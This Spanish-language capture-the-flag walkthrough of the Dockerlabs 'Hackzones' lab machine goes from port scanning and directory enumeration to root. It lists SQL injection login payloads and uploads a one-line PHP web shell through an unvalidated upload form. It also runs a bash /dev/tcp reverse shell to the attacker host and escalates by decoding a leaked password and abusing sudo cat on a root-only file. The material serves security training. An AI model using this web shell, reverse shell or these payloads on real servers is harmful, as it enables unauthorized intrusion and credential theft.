
# Writeup Template: Maquina `[ Hackzones ]`

- Tags: #Hackzones
- Dificultad: `[ Media ]`
- Plataforma: `[ Dockerlabs ]`

---
## Enlace al laboratorio
[Maquina Hackzones](https://mega.nz/file/CdFVBKgb#fYIZ1IRaYjzVjrjmGOzODDquAul8U-wiFpy8Bu2vBA4)

## Configuracion del Entorno
```bash
# Comandos para desplegar el laboratorio
7z x hackzones.zip
sudo bash auto_deploy.sh hackzones.tar
```

---
## Fase de Reconocimiento

### Direccion IP del Target
```bash
172.17.0.2
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 172.17.0.2 
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 172.17.0.2
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 172.17.0.2 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p22,53,80 -p 80 172.17.0.2
```

**Servicios identificados:**
```bash
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
53/tcp open  domain  ISC BIND 9.18.28-0ubuntu0.24.04.1 (Ubuntu Linux)
80/tcp open  http    Apache httpd 2.4.58 ((UbuntuNoble))
```
---

## Enumeracion de [Servicio Web Principal]
direccion **URL** del servicio:
```bash
http://172.17.0.2
```
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://172.17.0.2 # No reporta nada critico
```

Lanzamos un script de **Nmap** para reconocimiento de rutas
```bash
nmap --script http-enum -p 80 172.17.0.2 # No reporta nada critico
```
### Descubrimiento de Rutas
```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 --add-slash
```

**Hallazgos Relevantes:**
	No reporta nada relevante

### Descubrimiento de Archivos
```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 -x php,php.back,backup,sh,txt
```

- **Hallazgos**:
	No reporta nada relevante

## Enumeracion de [Servicio DNS]
Procedemos a registrar este dominio en nuestro archivo: **( /etc/host )**
```bash
172.17.0.2 hackzones.hl
```

Sabiendo que tenemos un servicio **DNS** expuesto intentaremos ver si podemos realizar un: **AtaqueTransferenciaZona (AXFR – Full Zone Transfer)**
Una ves agregado el dominio volvemos a enumerar:
```bash
gobuster dir -u http://hackzones.hl/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 --add-slash
```

Resultado:
```bash
/uploads/             (Status: 200) [Size: 743]
```

Volvemos a enumerar archivos y ahora si que tenemos informacion valiosa:
```bash
gobuster dir -u http://hackzones.hl/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 -x php,php.back,backup,sh,txt
```

Resultado:
```bash
/uploads              (Status: 301) [Size: 314] [--> http://hackzones.hl/uploads/]
/upload.php           (Status: 200) [Size: 1377]
/authenticate.php     (Status: 302) [Size: 0] [--> index.html?error=1]
/dashboard.html       (Status: 200) [Size: 5671]
```

###### Probando la seguridad del panel de inicio de sesion:
Tenemso un panel de inico de sesion en el que probaremos **SQLInjections**
```bash
http://hackzones.hl/
```

Queryes probadas:
```bash
'
admin'
admin' or 1=1-- -
admin' or '1'='1-- -
admin' or '1'='1
admin' or sleep(5)--
```

Ya que en ninguna la query de acceso al login se rompio descartamos este ataque por el momento

###### Enumeracion del la ruta:
Tenemos estea archivo de **php** el cual nos permitiria subir archivos al servidor probaremos si es vulnerable.
```bash
http://hackzones.hl/upload.php
```

Una ves cargado el recurso vemos que contiene errores que no dejan que sea presentado correctamente:
```bash
**Warning**: Undefined array key "file" in **/var/www/hackzones.hl/upload.php** on line **11**  
  
**Warning**: Trying to access array offset on null in **/var/www/hackzones.hl/upload.php** on line **11**  
  
**Deprecated**: basename(): Passing null to parameter #1 ($path) of type string is deprecated in **/var/www/hackzones.hl/upload.php** on line **11**  
  
**Warning**: Undefined array key "file" in **/var/www/hackzones.hl/upload.php** on line **13**  
  
**Warning**: Trying to access array offset on null in **/var/www/hackzones.hl/upload.php** on line **13**  
  
**Deprecated**: move_uploaded_file(): Passing null to parameter #1 ($from) of type string is deprecated in **/var/www/hackzones.hl/upload.php** on line **13**  
  
**Warning**: Undefined array key "file" in **/var/www/hackzones.hl/upload.php** on line **16**  
  
**Warning**: Trying to access array offset on null in **/var/www/hackzones.hl/upload.php** on line **16**  
Hubo un error al subir el archivo. Código de error:
```

**Nota** Tenemos un boton: **VolverDashboard** el cual le daremos click para ver a donde nos lleva:
```bash
http://hackzones.hl/dashboard.html
```

Nos lleva a una ruta que previamente habiamos descubierto con el ataque de **extensiones** y todo parace indicar que es el panel de administracion de **admin** del sistema
Revisando el codigo fuente en el panel de administracion detecto que al parecer podemos modificar la foto de perfil y cuando subimos una foto se carga en la siguiente ruta:
```bash
http://hackzones.hl/uploads/
```

Esto quiere decir que si logramos cargar una imagen con contenido malicioso y se ve cargada en el direcctorio: **( /uploads )** tendriamos una via potencial para tomara acceso al sistema.
```html
<!-- Modal para cambiar la foto de perfil -->
    <div id="profileModal" class="modal">
        <div class="modal-content">
            <button class="close-btn" id="closeModal">&times;</button>
            <h2>Cambiar Foto de Perfil</h2>
            <form action="[upload.php](view-source:http://hackzones.hl/upload.php)" method="POST" enctype="multipart/form-data">
                <label for="file">Selecciona una nueva foto:</label>
                <input type="file" name="file" id="file" accept="*/*" required>
                <br><br>
                <button class="upload-btn" type="submit">Subir archivo</button>
            </form>
        </div>
    </div>
```

Para comprobar esto primero cargaremos una imagen legitima en la foto de perfil para ver como reacciona la web:
Al subir la nueva foto se carga este archivo: **( upload.php )** que es el que se encarga se subir el archivo al servidor
```bash
http://hackzones.hl/upload.php
```

Una ves subido nos retorna este mensaje:
```bash
El archivo terminal.png se ha subido correctamente.
```

Despues un boton: **VolverDashboard** pero si le damos **clic** nos retorna al panel del administrador pero no vemos la foto nueva reflejada
Ahora si nos dirigimos al directorio donde sabemos que se pueden cargar los archivos que subamos: **( crtl + r )** para recargar esta url:
Aqui si que vemos reflejada nuestra imagen que previamente habiamos subido
```bash
http://hackzones.hl/uploads/
```

---
## Explotacion de Vulnerabilidades
### Vector de Ataque
Como atacante intentare vulnerar este archivo si es que no esta sanitizada la carga de archivo, Subire uno con contenido malicioso que me permita realizar una llamada la cual bajo un parametro que yo defina me permita ejecutar un comando a nivel de sistema:
Nuestro archivo malicioso: **( cmd.php )**
**Nota** En caso de que no admita este tipo de archivos realizaremos varias variantes hasta que nos permita subirlo.
```php
<?php
  system($_GET["cmd"]);
?>
```

### Ejecucion del Ataque
**Nota** Al intentar subir el archivo malicioso si que nos ha dejado y se ha cargado correctamente en la carpeta: **( /uploads )**
Al ejecutarlo tenemos ejecucion remota de comandos: **RCE**
```bash
# Comandos para explotación
http://hackzones.hl/uploads/cmd.php?cmd=whoami
```

### Intrusion
Una ves ejecutado comando de manera exitosa nos pondremos en escucha en nuestra maquina de atacante:
```bash
nc -nlvp 443
```

Ganamos acceso al **target**
```bash
# Reverse shell o acceso inicial
http://hackzones.hl/uploads/cmd.php?cmd=bash -c 'exec bash -i %26>/dev/tcp/172.17.0.1/443 <%261'
```

---

## Escalada de Privilegios
### Enumeracion del Sistema
Retrocediendo entre directorios tenemos este: **supermegaultrasecretfolder** en la siguiente ruta
```bash
# Comandos clave ejecutados
/var/www/html/supermegaultrasecretfolder
```

**Hallazgos Clave:**
Listando el contenido de este directorio vemos lo siguiente:
```bash
-rw-r--r-- 1 root root  336 Nov 15  2024 secret.sh
```

Tenemos un archiov que pertenece a **root** y su contenido solo puede ser ejecutado como **root**:
```bash
#!/bin/bash

if [ "$(id -u)" -ne 0 ]; then
  echo "Este script debe ser ejecutado como root."
  exit 1
fi

p1=$(echo -e "\x50\x61\x73\x73\x77\x6f\x72\x64") 
p2="\x40"                                       
p3="\x24\x24"                                   
p4="\x21\x31\x32\x33"                           

echo -e "${p1}${p2}${p3}${p4}"
```
### Explotacion de Privilegios

###### Usuario `[ www-data ]`:
Revisando usuario en el sistema tenemos 1, El cual tenemos que ver como podemos secuestrar su sesion:
```bash
mrrobot:x:1000:1000::/home/mrRobot:/bin/bash
```

Revisando el contenido del directorio: **( /tmp )**
```bash
ls -l /tmp
```

Tenemos un archivo: **( test )** y revisando su contenido:
```bash
flag    IN      TXT     "FLAG{05964683-55675-23423-985046}"
User    IN      TXT     mrRobot@hackzone.hl
```

Sabiendo que no podemos ejecutar el archivo: **( secret.sh )** pero vemos que existe el binario de **python**
```bash
which python3

/usr/bin/python3
```

Lo que aremos es montar un servidor **python** por el puerto **8080**:
```bash
python3 -m http.server 8080
```

Ahora desde nuestra maquina atacante realizaremos la solicitud para descargar el archivo:
```bash
wget http://172.17.0.2:8080/secret.sh
```

Ya descargado ahora nos pertenece este archivo y si que podemos ejecutarlo en nuestra maquina de atacante:
```bash
sudo bash secret.sh
```

Tenemos la siguiente contrasena que podremos probar con los dos usuarios del sistema **( root / mrrobot )**:
```bash
Password@$$!123
```

```bash
# Comando para escalar al usuario: ( mrrobot )
su mrrobot # ( Password@$$!123 )
```

###### Usuario `[ mrrobot ]`:
Listando los permisos de este usuario:
```bash
User mrrobot may run the following commands on 16e597a9e1d0:
    (ALL : ALL) NOPASSWD: /usr/bin/cat # Tenemos una via potencila de migrar a root
```

Ahora tenemos este archivo:
```bash
ls -l /opt/
```

El cual no teniamos capacidad de lectura:
```bash
-rw------- 1 root root 1827 Nov 15  2024 SistemUpdate
```

Nos aprovechamos del binario: **cat** para leer su contendio ya que podemos ejecutarlo como **root**
```bash
sudo -u root /usr/bin/cat /opt/SistemUpdate 
```

Tenemos la posible contrasena del usuario **root**:
```bash
Extracting user root:rooteable from packages: 50%
```

Nos logueamos como **root**
```bash
su root # ( rooteable )
```

---

## Evidencia de Compromiso
Flags:
```bash
-rw-r--r--  1 root root   33 Nov 15  2024 TrueRoot.txt
-rw-r--r--  1 root root   41 Nov 15  2024 root.txt

f034967ad357f8f912740101d3af5e71
Don't think it's that easy, keep looking
```

```bash
# Captura de pantalla o output final
root@16e597a9e1d0:~# whoami
root
```

---

## Lecciones Aprendidas
1. Aprendimos a cargar archivos maliciosos atraves de un archivo **php** que no valida el tipo de archivo.
2. Aprendimos a desacargar archivo de **root** en nuestra maquina atacante, Para poder ejecutarlo como **root** en nuestro sistema y poder llegar a ver el contenido
3. Aprendimos a ver contenido de archivos sensibles del sistema, gracias al binario **cat**